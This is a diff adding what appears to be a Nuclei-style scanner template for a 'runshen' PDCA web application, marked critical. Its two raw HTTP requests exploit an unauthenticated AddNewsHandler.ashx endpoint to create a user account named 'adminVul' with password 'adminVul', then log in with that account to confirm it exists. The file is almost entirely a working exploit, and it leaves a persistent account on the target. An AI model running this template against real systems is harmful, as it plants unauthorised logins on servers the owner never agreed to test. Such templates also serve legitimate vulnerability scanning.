@@ -1,0 +1,38 @@
+id: runshen-AddNewsHandler-useradd
+
+info:
+  name: runshen-AddNewsHandler-useradd
+  author: sm
+  severity: critical
+
+requests:
+  - raw:
+      - |              
+        POST /PDCA/ashx/AddNewsHandler.ashx?action=Adduser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        username=adminVul&pwd=adminVul&savedays=1
+          
+      - |
+        POST /ashx/loginhandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=adminVul&password=adminVul
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_1==200 && body_1 == "1"
+          - status_code_2==200 && contains_all(body_2,'success','true')
